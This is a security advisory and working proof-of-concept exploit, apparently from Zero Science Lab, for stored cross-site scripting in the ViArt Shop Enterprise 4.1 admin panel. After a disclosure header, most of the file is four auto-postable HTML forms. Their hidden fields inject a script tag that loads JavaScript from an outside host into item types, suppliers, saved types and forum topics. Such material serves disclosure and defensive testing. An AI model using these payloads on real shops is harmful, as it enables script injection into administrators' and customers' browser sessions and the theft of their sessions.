@@ -1,0 +1,110 @@
+<!--
+
+ViArt Shop Enterprise 4.1 (post-auth) Multiple Stored XSS Vulnerabilities
+
+
+Vendor: ViArt Software
+Product web page: http://www.viart.com
+Affected version: 4.1, 4.0.8 and 4.0.5
+
+Summary: Viart Shop is a PHP based e-commerce suite, aiming to provide everything
+you need to run a successful on-line business.
+
+Desc: ViArt Shop suffers from multiple stored cross-site scripting vulnerabilities.
+The issues are triggered when input passed via several parameters to several scripts
+is not properly sanitized before being returned to the user. This can be exploited to
+execute arbitrary HTML and script code in a user's browser session in context of an
+affected site.
+
+Tested on: Microsoft Windows 7 Ultimate SP1 (EN)
+           Apache 2.4.2 (Win32)
+           PHP 5.4.4
+           MySQL 5.5.25a
+
+
+Vulnerabilities discovered by Gjoko 'LiquidWorm' Krstic
+                              @zeroscience
+							
+Exploit coded by teppei (iki@zeroscience.mk)
+
+
+Vendor status:
+
+[09.09.2012] Vulnerabilities discovered.
+[24.09.2012] Contact with the vendor.
+[24.09.2012] Vendor responds asking more details.
+[24.09.2012] Sent detailed information to the vendor.
+[25.09.2012] Vendor confirms the issues, releasing fix (http://www.viart.com/downloads/viart_shop-4.1.zip).
+[25.09.2012] Coordinated public security advisory released.
+
+
+Advisory ID: ZSL-2012-5108
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2012-5108.php
+
+
+09.09.2012
+
+-->
+
+<html>
+<head>
+<title>ViArt Shop Enterprise 4.1 (post-auth) Multiple Stored XSS Vulnerabilities</title>
+</head>
+<body><center><br />
+<form method="post" action="http://localhost/viart/admin/admin_item_type.php">
+<input type="hidden" name="affiliate_commission_amount" value="2" />
+<input type="hidden" name="affiliate_commission_type" value="" />
+<input type="hidden" name="credit_reward_amount" value="" />
+<input type="hidden" name="credit_reward_type" value="" />
+<input type="hidden" name="google_base_type_id" value="-1" />
+<input type="hidden" name="item_type_id" value="" />
+<input type="hidden" name="item_type_name" value='"><script src="http://zeroscience.mk/codes/dae.js"></script>' />
+<input type="hidden" name="merchant_fee_amount" value="1" />
+<input type="hidden" name="merchant_fee_type" value="0" />
+<input type="hidden" name="operation" value="save" />
+<input type="hidden" name="reward_amount" value="" />
+<input type="hidden" name="reward_type" value="" />
+<input type="submit" value="Xploit #1" />
+</form>
+<br />
+<form method="post" action="http://localhost/viart/admin/admin_supplier.php">
+<input type="hidden" name="full_description" value="1" />
+<input type="hidden" name="operation" value="save" />
+<input type="hidden" name="short_description" value="ZSL" />
+<input type="hidden" name="supplier_email" value="lab@zeroscience.mk" />
+<input type="hidden" name="supplier_id" value="" />
+<input type="hidden" name="supplier_name" value='"><script src="http://zeroscience.mk/codes/dae.js"></script>' />
+<input type="hidden" name="supplier_order" value="1" />
+<input type="submit" value="Xploit #2" />
+</form>
+<br />
+<form method="post" action="http://localhost/viart/admin/admin_saved_type.php">
+<input type="hidden" name="allowed_search" value="1" />
+<input type="hidden" name="is_active" value="1" />
+<input type="hidden" name="operation" value="save" />
+<input type="hidden" name="type_desc" value="thricer" />
+<input type="hidden" name="type_id" value="" />
+<input type="hidden" name="type_name" value='"><script src="http://zeroscience.mk/codes/dae.js"></script>' />
+<input type="submit" value="Xploit #3" />
+</form>
+<br />
+<form method="post" action="http://localhost/viart/admin/admin_forum_topic.php">
+<input type="hidden" name="attachments_url" value="admin_forum_attachments.php" />
+<input type="hidden" name="description" value="sm" />
+<input type="hidden" name="forum_id" value="1" />
+<input type="hidden" name="friendly_url" value="Ecchi" />
+<input type="hidden" name="operation" value="save" />
+<input type="hidden" name="priority_id" value="1" />
+<input type="hidden" name="remote_address" value='"><script src="http://zeroscience.mk/codes/dae.js"></script>' />
+<input type="hidden" name="rp" value="admin_forum_thread.php?thread_id=" />
+<input type="hidden" name="thread_id" value="" />
+<input type="hidden" name="topic" value='"><script src="http://zeroscience.mk/codes/dae.js"></script>' />
+<input type="hidden" name="user_email" value="iki@zeroscience.mk" />
+<input type="hidden" name="user_id" value="2" />
+<input type="hidden" name="user_name" value="apo" />
+<input type="hidden" name="views" value="2" />
+<input type="submit" value="Xploit #4" />
+</form>
+</center>
+</body>
+</html>
